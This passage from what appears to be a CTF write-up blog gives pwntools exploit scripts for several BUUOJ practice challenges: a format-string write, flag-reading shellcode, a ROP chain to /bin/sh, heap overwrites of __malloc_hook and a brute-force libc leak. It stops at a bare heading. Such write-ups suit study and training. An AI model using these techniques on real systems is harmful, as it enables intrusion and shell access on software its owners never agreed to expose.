<h2 id="0x91-jarvisoj-fm">0x91 jarvisoj_fm</h2>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">sh &#x3D; remote(&quot;node3.buuoj.cn&quot;,28276)</span><br><span class="line">#sh &#x3D; process(&quot;.&#x2F;fm&quot;)</span><br><span class="line">payload &#x3D; p32(0x0804A02C)+&#39;%11$n&#39;</span><br><span class="line">sh.send(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
<h2 id="0x92-pwnable-orw">0x92 pwnable_orw</h2>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">#!&#x2F;usr&#x2F;bin&#x2F;python2.7  </span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line">from pwn import *</span><br><span class="line">context.log_level &#x3D; &quot;debug&quot;</span><br><span class="line">context.arch &#x3D; &quot;i386&quot;</span><br><span class="line">elf &#x3D; ELF(&quot;orw&quot;)</span><br><span class="line">lib &#x3D; 0</span><br><span class="line">sh &#x3D; 0</span><br><span class="line">def pwn(ip,port,debug):</span><br><span class="line">	global lib</span><br><span class="line">	global sh</span><br><span class="line">	if(debug &#x3D;&#x3D; 1):</span><br><span class="line">		sh &#x3D; process(&quot;.&#x2F;orw&quot;)</span><br><span class="line">		lib &#x3D; ELF(&quot;&#x2F;lib&#x2F;i386-linux-gnu&#x2F;libc.so.6&quot;)</span><br><span class="line">	else:</span><br><span class="line">		sh &#x3D; remote(ip,port)</span><br><span class="line">		lib &#x3D; ELF(&quot;&#x2F;lib&#x2F;i386-linux-gnu&#x2F;libc.so.6&quot;)</span><br><span class="line">	shellcode &#x3D; shellcraft.open(&quot;&#x2F;flag&quot;)</span><br><span class="line">	shellcode +&#x3D; shellcraft.read(3,elf.bss(),0x100)</span><br><span class="line">	shellcode +&#x3D; shellcraft.write(1,elf.bss(),0x100)</span><br><span class="line">	sh.sendline(asm(shellcode))</span><br><span class="line">	sh.interactive()</span><br><span class="line">if __name__ &#x3D;&#x3D; &quot;__main__&quot;:</span><br><span class="line">	pwn(&quot;node3.buuoj.cn&quot;,28498,0)</span><br></pre></td></tr></table></figure>
<h2 id="0x93-jarvisoj-typo">0x93 jarvisoj_typo</h2>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">#sh &#x3D; process(&quot;.&#x2F;typo&quot;)</span><br><span class="line">sh &#x3D; remote(&quot;node3.buuoj.cn&quot;,28213)</span><br><span class="line">elf &#x3D; ELF(&quot;typo&quot;)</span><br><span class="line">offset &#x3D; 112</span><br><span class="line">pop3_ret &#x3D; 0x00020904</span><br><span class="line">payload  &#x3D; offset * &quot;a&quot; </span><br><span class="line">payload +&#x3D; p32(pop3_ret) + p32(elf.search(&quot;&#x2F;bin&#x2F;sh\x00&quot;).next()) + p32(0) + p32(0x110B4)</span><br><span class="line">sh.sendlineafter(&quot;\n&quot;,&quot;&quot;)</span><br><span class="line">sh.send(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
<h2 id="0x94-others-shellcode">0x94 others_shellcode</h2>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">连接就出flag 有点水</span><br></pre></td></tr></table></figure>
<h2 id="0x95-huxiangbei-2019-hacknote">0x95 huxiangbei_2019_hacknote</h2>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line">#!&#x2F;usr&#x2F;bin&#x2F;python2.7  </span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line">from pwn import *</span><br><span class="line">context.log_level &#x3D; &quot;debug&quot;</span><br><span class="line">context.arch &#x3D; &quot;amd64&quot;</span><br><span class="line">elf &#x3D; ELF(&quot;HackNote&quot;)</span><br><span class="line">lib &#x3D; 0</span><br><span class="line">sh &#x3D; 0</span><br><span class="line">def pwn(ip,port,debug):</span><br><span class="line">	global lib</span><br><span class="line">	global sh</span><br><span class="line">	if(debug &#x3D;&#x3D; 1):</span><br><span class="line">		sh &#x3D; process(&quot;.&#x2F;true&quot;)</span><br><span class="line">	else:</span><br><span class="line">		sh &#x3D; remote(ip,port)</span><br><span class="line">	def add(size,content):</span><br><span class="line">		sh.sendlineafter(&quot;-----------------&quot;,&quot;1&quot;)</span><br><span class="line">		sh.sendlineafter(&quot;Input the Size&quot;,str(size))</span><br><span class="line">		sh.sendafter(&quot;:&quot;,content)</span><br><span class="line">	def free(idx):</span><br><span class="line">		sh.sendlineafter(&quot;-----------------&quot;,&quot;2&quot;)</span><br><span class="line">		sh.sendlineafter(&quot;:&quot;,str(idx))</span><br><span class="line">	def edit(idx,content):</span><br><span class="line">		sh.sendlineafter(&quot;-----------------&quot;,&quot;3&quot;)</span><br><span class="line">		sh.sendlineafter(&quot;:&quot;,str(idx))</span><br><span class="line">		sh.sendafter(&quot;:&quot;,content)</span><br><span class="line">	shellcode &#x3D; asm(&quot;xor rax,rax&quot;)</span><br><span class="line">	shellcode +&#x3D; &#39;\x50\x48\x31\xd2\x48\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x54\x5f\xb0\x3b\x0f\x05&#39;</span><br><span class="line">	__free_hook &#x3D; 0x6CD5E8</span><br><span class="line">	__malloc_hook &#x3D; 0x6CB788</span><br><span class="line">	add(0x18,&#39;\x11&#39;*0x18)</span><br><span class="line">	edit(0, &#39;\x11&#39;*0x18)</span><br><span class="line">	add(0x18, &#39;\x12&#39;*0x18)</span><br><span class="line">	add(0x40-8,&#39;\x13&#39;*0x38)</span><br><span class="line">	add(0x10, &#39;\x14&#39;*0x10)</span><br><span class="line">	add(0x10, &#39;\x15&#39;*0x10)</span><br><span class="line">	edit(0,&#39;\x11&#39;*0x18+&#39;\x81&#39;+&#39;\n&#39;)</span><br><span class="line">	free(2)</span><br><span class="line">	free(1)</span><br><span class="line">	add(0x80-8,&#39;A&#39;*0x18+p64(0x41)+p64(__malloc_hook - 0x10  - 6)+&#39;\n&#39;)</span><br><span class="line">	add(0x38,&#39;aaaa\n&#39;)</span><br><span class="line">	add(0x38,&#39;aaaaaa&#39; + p64(__malloc_hook + 8) + shellcode + &quot;\n&quot;)</span><br><span class="line">	add(0x88,&#39;\n&#39;)</span><br><span class="line">	&#39;&#39;&#39;</span><br><span class="line">	libc &#x3D; __libc_start_main - lib.symbols[&#39;__libc_start_main&#39;]</span><br><span class="line">	system &#x3D; libc +lib.symbols[&#39;system&#39;]</span><br><span class="line">	binsh &#x3D; libc +lib.search(&quot;&#x2F;bin&#x2F;sh\x00&quot;).next()</span><br><span class="line">	__free_hook &#x3D; libc +lib.symbols[&#39;__free_hook&#39;]</span><br><span class="line">	__malloc_hook &#x3D; libc +lib.symbols[&#39;__malloc_hook&#39;]</span><br><span class="line">	log.success(&quot;libc: &quot; + hex(libc))</span><br><span class="line">	log.success(&quot;system: &quot; + hex(system))</span><br><span class="line">	log.success(&quot;binsh: &quot; + hex(binsh))</span><br><span class="line">	log.success(&quot;__free_hook: &quot; + hex(__free_hook))</span><br><span class="line">	log.success(&quot;__malloc_hook: &quot; + hex(__malloc_hook))</span><br><span class="line">	&#39;&#39;&#39;</span><br><span class="line">	sh.interactive()</span><br><span class="line">if __name__ &#x3D;&#x3D; &quot;__main__&quot;:</span><br><span class="line">	pwn(&quot;node3.buuoj.cn&quot;,26378,0)</span><br></pre></td></tr></table></figure>
<h2 id="0x96-shanghai2019-boringheap">0x96 shanghai2019_boringheap</h2>
<h3 id="该exp是真实比赛的exp，ubuntu16，Buuoj为Ubuntu18">该exp是真实比赛的exp，ubuntu16，Buuoj为Ubuntu18</h3>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br></pre></td><td class="code"><pre><span class="line">#!&#x2F;usr&#x2F;bin&#x2F;python2.7  </span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line">from pwn import *</span><br><span class="line">context.log_level &#x3D; &quot;debug&quot;</span><br><span class="line">context.arch &#x3D; &quot;amd64&quot;</span><br><span class="line">elf &#x3D; ELF(&quot;pwn&quot;)</span><br><span class="line">lib &#x3D; 0</span><br><span class="line">sh &#x3D; 0</span><br><span class="line">def pwn(ip,port,debug):</span><br><span class="line">	global lib</span><br><span class="line">	global sh</span><br><span class="line">	if(debug &#x3D;&#x3D; 1):</span><br><span class="line">		#sh &#x3D; process(&quot;.&#x2F;pwn&quot;,env&#x3D;&#123;&quot;LD_PRELOAD&quot;:&quot;&#x2F;home&#x2F;pig&#x2F;Pig&#x2F;CTF&#x2F;ShangHai&#x2F;19.11.2&#x2F;pwn&#x2F;boringheap&#x2F;libc.so&quot;&#125;)</span><br><span class="line">		sh &#x3D; process(&quot;.&#x2F;pwn&quot;)</span><br><span class="line">		lib &#x3D; ELF(&quot;&#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;libc.so.6&quot;)</span><br><span class="line">	else:</span><br><span class="line">		sh &#x3D; remote(ip,port)</span><br><span class="line">		lib &#x3D; ELF(&quot;libc-2.23_x64.so&quot;)</span><br><span class="line">	def add(size,content):</span><br><span class="line">		sh.sendlineafter(&quot;5.&quot;,&quot;1&quot;)#0x20 0x30 0x40</span><br><span class="line">		sh.sendlineafter(&quot;3.Large&quot;,str(size))</span><br><span class="line">		sh.sendafter(&quot;:&quot;,content)</span><br><span class="line">	def edit(idx,size,content):</span><br><span class="line">		sh.sendlineafter(&quot;5.&quot;,&quot;2&quot;)</span><br><span class="line">		sh.sendlineafter(&quot;?&quot;,str(idx))</span><br><span class="line">		sh.sendlineafter(&quot;?&quot;,str(size))</span><br><span class="line">		sh.sendafter(&quot;:&quot;,content)</span><br><span class="line">	def show(idx):</span><br><span class="line">		sh.sendlineafter(&quot;5.&quot;,&quot;4&quot;)</span><br><span class="line">		sh.sendlineafter(&quot;?&quot;,str(idx))</span><br><span class="line">	def free(idx):</span><br><span class="line">		sh.sendlineafter(&quot;5.&quot;,&quot;3&quot;)</span><br><span class="line">		sh.sendlineafter(&quot;?&quot;,str(idx))</span><br><span class="line">	add(3,&quot;\x11&quot; * 0x40)</span><br><span class="line">	add(2,&#39;\x12&#39; * 0x30)</span><br><span class="line">	add(3,&#39;\x13&#39; * 0x40)</span><br><span class="line">	add(3,&#39;\x14&#39; * 0x40)</span><br><span class="line">	add(1,p64(0) + p64(0x51) + &quot;\n&quot;)</span><br><span class="line">	#payload &#x3D; &#39;a&#39; * 0x28 + &#39;\xa1&#39;</span><br><span class="line">	payload &#x3D; p64(0)*3 + p64(0x91) + &#39;\n&#39;</span><br><span class="line">	edit(1,0x80000000,payload)</span><br><span class="line">	free(1)</span><br><span class="line">	add(2,&#39;\n&#39;)</span><br><span class="line">	show(5)</span><br><span class="line">	libc &#x3D; u64(sh.recvuntil(&quot;\x7f&quot;,False)[-6:].ljust(8,&#39;\x00&#39;)) - 2 + 8 - lib.symbols[&#39;__malloc_hook&#39;]</span><br><span class="line">	system &#x3D; libc +lib.symbols[&#39;system&#39;]</span><br><span class="line">	binsh &#x3D; libc +lib.search(&quot;&#x2F;bin&#x2F;sh\x00&quot;).next()</span><br><span class="line">	__free_hook &#x3D; libc +lib.symbols[&#39;__free_hook&#39;]</span><br><span class="line">	__malloc_hook &#x3D; libc +lib.symbols[&#39;__malloc_hook&#39;]</span><br><span class="line">	add(3,&#39;\x15&#39; * 0x40)</span><br><span class="line">	free(2)</span><br><span class="line">	free(4)</span><br><span class="line">	edit(6,0,p64(__malloc_hook - (0x7fd96e4f4b10 - 0x7fd96e4f4b2d)) + &#39;\n&#39;)</span><br><span class="line">	</span><br><span class="line">	add(3,&#39;\n&#39;)</span><br><span class="line">	add(3,&#39;\x00&#39;*3 + p64(__malloc_hook + 0x10 + 48) + p64(0)*2 + p64(0x51) + &#39;\n&#39;)</span><br><span class="line">	add(3,&#39;a&#39; * 0x17+&#39;\n&#39;)</span><br><span class="line">	show(9)</span><br><span class="line">	sh.recvuntil(&quot;a&quot; * 0x17 + &#39;\n&#39;)</span><br><span class="line">	heap_base &#x3D; (u64(sh.recvuntil(&quot;\n&quot;,True)[-6:].ljust(8,&#39;\x00&#39;)) &gt;&gt; 12) &lt;&lt; 12</span><br><span class="line">	pie &#x3D; heap_base - 0x203000</span><br><span class="line">	chunk_list &#x3D; pie + 0x2020C0</span><br><span class="line">	</span><br><span class="line">	#edit(8,0,&#39;\x00&#39;*3 + p64(heap_base + 0x140) + p64(0) * 2 + &quot;\n&quot;)</span><br><span class="line">	edit(8,0,&#39;\x00&#39;*3 + p64(0) * 5 + &quot;\n&quot;)</span><br><span class="line">	#add(3,p64(0) * 3 + p64(0xffffffffffffffff) + &quot;\n&quot;)</span><br><span class="line">	edit(9,0,p64(0) * 3 + p64(__malloc_hook - 0x10) + &quot;\n&quot;)</span><br><span class="line">	#add(3,&#39;\x00&#39; * 3 + p64(0) + p64(__free_hook) + p64(0) + p64(binsh) + &quot;\n&quot;)</span><br><span class="line">	#edit(3,0,p64(system) + &quot;\n&quot;)</span><br><span class="line">	#free(5)</span><br><span class="line">	#add(1,&#39;&#x2F;bin&#x2F;sh\n&#39;)</span><br><span class="line">	&#39;&#39;&#39;</span><br><span class="line">0x45216 execve(&quot;&#x2F;bin&#x2F;sh&quot;, rsp+0x30, environ)</span><br><span class="line">constraints:</span><br><span class="line">  rax &#x3D;&#x3D; NULL</span><br><span class="line"></span><br><span class="line">0x4526a execve(&quot;&#x2F;bin&#x2F;sh&quot;, rsp+0x30, environ)</span><br><span class="line">constraints:</span><br><span class="line">  [rsp+0x30] &#x3D;&#x3D; NULL</span><br><span class="line"></span><br><span class="line">0xf02a4 execve(&quot;&#x2F;bin&#x2F;sh&quot;, rsp+0x50, environ)</span><br><span class="line">constraints:</span><br><span class="line">  [rsp+0x50] &#x3D;&#x3D; NULL</span><br><span class="line"></span><br><span class="line">0xf1147 execve(&quot;&#x2F;bin&#x2F;sh&quot;, rsp+0x70, environ)</span><br><span class="line">constraints:</span><br><span class="line">  [rsp+0x70] &#x3D;&#x3D; NULL</span><br><span class="line">	&#39;&#39;&#39;</span><br><span class="line">	one_gadget &#x3D; libc + 0xf1147</span><br><span class="line">	add(2,p64(one_gadget) + &#39;\n&#39;)</span><br><span class="line">	sh.sendlineafter(&quot;5.&quot;,&quot;1&quot;)</span><br><span class="line">	sh.sendlineafter(&quot;3.&quot;,&quot;1&quot;)</span><br><span class="line">	log.success(&quot;heap_base: &quot; + hex(heap_base))</span><br><span class="line">	log.success(&quot;libc: &quot; + hex(libc))</span><br><span class="line">	log.success(&quot;system: &quot; + hex(system))</span><br><span class="line">	log.success(&quot;binsh: &quot; + hex(binsh))</span><br><span class="line">	log.success(&quot;__free_hook: &quot; + hex(__free_hook))</span><br><span class="line">	log.success(&quot;__malloc_hook: &quot; + hex(__malloc_hook))	</span><br><span class="line">	log.success(&quot;libc: &quot; + hex(libc))</span><br><span class="line">	#gdb.attach(sh)</span><br><span class="line">	&#39;&#39;&#39;</span><br><span class="line">	libc &#x3D; __libc_start_main - lib.symbols[&#39;__libc_start_main&#39;]</span><br><span class="line">	system &#x3D; libc +lib.symbols[&#39;system&#39;]</span><br><span class="line">	binsh &#x3D; libc +lib.search(&quot;&#x2F;bin&#x2F;sh\x00&quot;).next()</span><br><span class="line">	__free_hook &#x3D; libc +lib.symbols[&#39;__free_hook&#39;]</span><br><span class="line">	__malloc_hook &#x3D; libc +lib.symbols[&#39;__malloc_hook&#39;]</span><br><span class="line">	log.success(&quot;libc: &quot; + hex(libc))</span><br><span class="line">	log.success(&quot;system: &quot; + hex(system))</span><br><span class="line">	log.success(&quot;binsh: &quot; + hex(binsh))</span><br><span class="line">	log.success(&quot;__free_hook: &quot; + hex(__free_hook))</span><br><span class="line">	log.success(&quot;__malloc_hook: &quot; + hex(__malloc_hook))</span><br><span class="line">	&#39;&#39;&#39;</span><br><span class="line">	sh.interactive()</span><br><span class="line">if __name__ &#x3D;&#x3D; &quot;__main__&quot;:</span><br><span class="line">	pwn(&quot;node3.buuoj.cn&quot;,26065,1)</span><br></pre></td></tr></table></figure>
<h2 id="0x97-shanghai2019-login">0x97 shanghai2019_login</h2>
<h3 id="该exp是真实比赛的exp，ubuntu16，Buuoj为Ubuntu18-2">该exp是真实比赛的exp，ubuntu16，Buuoj为Ubuntu18</h3>
<h3 id="爆破libc">爆破libc</h3>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br></pre></td><td class="code"><pre><span class="line">#!&#x2F;usr&#x2F;bin&#x2F;python2.7  </span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line">from pwn import *</span><br><span class="line">context.log_level &#x3D; &quot;debug&quot;</span><br><span class="line">context.arch &#x3D; &quot;amd64&quot;</span><br><span class="line">elf &#x3D; ELF(&quot;login&quot;)</span><br><span class="line">lib &#x3D; 0</span><br><span class="line">sh &#x3D; 0</span><br><span class="line">def pwn(ip,port,debug):</span><br><span class="line">	global lib</span><br><span class="line">	global sh</span><br><span class="line">	if(debug &#x3D;&#x3D; 1):</span><br><span class="line">		sh &#x3D; process(&quot;.&#x2F;login&quot;)</span><br><span class="line">		lib &#x3D; ELF(&quot;&#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;libc.so.6&quot;)</span><br><span class="line">	else:</span><br><span class="line">		sh &#x3D; remote(ip,port)</span><br><span class="line">		lib &#x3D; ELF(&quot;libc-2.23_x64.so&quot;)</span><br><span class="line">	def register(idx,size,content):</span><br><span class="line">		sh.sendlineafter(&quot;:&quot;,&quot;2&quot;)</span><br><span class="line">		sh.sendlineafter(&quot;:&quot;,str(idx))</span><br><span class="line">		sh.sendlineafter(&quot;:&quot;,str(size))</span><br><span class="line">		sh.sendafter(&quot;:&quot;,str(content))</span><br><span class="line">	def login(idx,size,content):</span><br><span class="line">		sh.sendlineafter(&quot;:&quot;,&quot;1&quot;)</span><br><span class="line">		sh.sendlineafter(&quot;:&quot;,str(idx))</span><br><span class="line">		sh.sendlineafter(&quot;:&quot;,str(size))</span><br><span class="line">		sh.sendafter(&quot;:&quot;,content)</span><br><span class="line">	def free(idx):</span><br><span class="line">		sh.sendlineafter(&quot;:&quot;,&quot;3&quot;)</span><br><span class="line">		sh.sendlineafter(&quot;:&quot;,str(idx))</span><br><span class="line">	def edit(idx,content):</span><br><span class="line">		sh.sendlineafter(&quot;:&quot;,&quot;4&quot;)</span><br><span class="line">		sh.sendlineafter(&quot;:&quot;,str(idx))</span><br><span class="line">		sh.sendafter(&quot;:&quot;,str(content))</span><br><span class="line">	def bomb(pos,content):</span><br><span class="line">		global sh</span><br><span class="line">		for i in range(0,0xff):</span><br><span class="line">			payload &#x3D; p64(0) + p64(0x21) + p64(elf.got[&#39;__libc_start_main&#39;] + 5 - pos) + p64(elf.plt[&#39;puts&#39;]) + p64(pos + 1)</span><br><span class="line">        		edit(1,payload)</span><br><span class="line">        		login(0,pos + 1,chr(i) + content)</span><br><span class="line">			data &#x3D; sh.recvuntil(&#39;---Menu---&#39;)</span><br><span class="line">			print(i)</span><br><span class="line">			if(data.find(&quot;success&quot;) !&#x3D; -1):</span><br><span class="line">				log.success(&quot;get!&quot; + hex(i))</span><br><span class="line">				return i</span><br><span class="line">	register(0,0x68,&#39;\x11&#39; * 0x68)</span><br><span class="line">	register(1,0x68,&#39;\x22&#39; * 0x68)</span><br><span class="line">	free(0)</span><br><span class="line">	free(1)</span><br><span class="line">	#0x400B94 call</span><br><span class="line">	#0x400B53 read</span><br><span class="line">	#login(0,0x7fffffff,p64(elf.got[&#39;__libc_start_main&#39;]) + p64(elf.plt[&#39;puts&#39;]))</span><br><span class="line">	#edit(0,p64(0))</span><br><span class="line"></span><br><span class="line">	#payload &#x3D; p64(0) + p64(0x21) + p64(elf.got[&#39;__libc_start_main&#39;] + 5) + p64(elf.plt[&#39;puts&#39;]) + p64(1)</span><br><span class="line">	#edit(1,payload)</span><br><span class="line">	#login(0,1,&#39;\x7f&#39;)</span><br><span class="line">	#__libc_start_main &#x3D; chr(bomb(0,&#39;&#39;))</span><br><span class="line">	__libc_start_main &#x3D; &#39;\x7f&#39;</span><br><span class="line">	__libc_start_main &#x3D; chr(bomb(1,__libc_start_main)) + __libc_start_main</span><br><span class="line">	__libc_start_main &#x3D; chr(bomb(2,__libc_start_main)) + __libc_start_main</span><br><span class="line">	__libc_start_main &#x3D; chr(bomb(3,__libc_start_main)) + __libc_start_main</span><br><span class="line">	__libc_start_main &#x3D; chr(bomb(4,__libc_start_main)) + __libc_start_main</span><br><span class="line">	#__libc_start_main &#x3D; chr(bomb(5,__libc_start_main)) + __libc_start_main</span><br><span class="line">	__libc_start_main &#x3D; &#39;\x40&#39; + __libc_start_main</span><br><span class="line">	__libc_start_main &#x3D; u64(__libc_start_main.ljust(8,&#39;\x00&#39;))</span><br><span class="line">	</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	log.success(&quot;__libc_start_main: &quot; + hex(__libc_start_main))	</span><br><span class="line">	#gdb.attach(sh)</span><br><span class="line">	log.success(&quot;__libc_start_main_got: &quot; + hex(elf.got[&#39;__libc_start_main&#39;]))</span><br><span class="line">	log.success(&quot;puts_plt: &quot; + hex(elf.plt[&#39;puts&#39;])) </span><br><span class="line">	libc &#x3D; __libc_start_main - lib.symbols[&#39;__libc_start_main&#39;]</span><br><span class="line">	system &#x3D; libc +lib.symbols[&#39;system&#39;]</span><br><span class="line">	binsh &#x3D; libc +lib.search(&quot;&#x2F;bin&#x2F;sh\x00&quot;).next()</span><br><span class="line">	__free_hook &#x3D; libc +lib.symbols[&#39;__free_hook&#39;]</span><br><span class="line">	__malloc_hook &#x3D; libc +lib.symbols[&#39;__malloc_hook&#39;]</span><br><span class="line"></span><br><span class="line">	payload &#x3D; p64(0) + p64(0x21) + p64(binsh) + p64(system) + p64(8)</span><br><span class="line">	edit(1,payload)</span><br><span class="line">	login(0,8,&#39;&#x2F;bin&#x2F;sh\x00&#39;)</span><br><span class="line"></span><br><span class="line">	log.success(&quot;libc: &quot; + hex(libc))</span><br><span class="line">	log.success(&quot;system: &quot; + hex(system))</span><br><span class="line">	log.success(&quot;binsh: &quot; + hex(binsh))</span><br><span class="line">	log.success(&quot;__free_hook: &quot; + hex(__free_hook))</span><br><span class="line">	log.success(&quot;__malloc_hook: &quot; + hex(__malloc_hook))</span><br><span class="line">	sh.interactive()</span><br><span class="line">if __name__ &#x3D;&#x3D; &quot;__main__&quot;:</span><br><span class="line">	pwn(&quot;node3.buuoj.cn&quot;,25522,0)</span><br></pre></td></tr></table></figure>
<h2 id="0x98-xdctf2015-pwn200">0x98 xdctf2015_pwn200</h2>
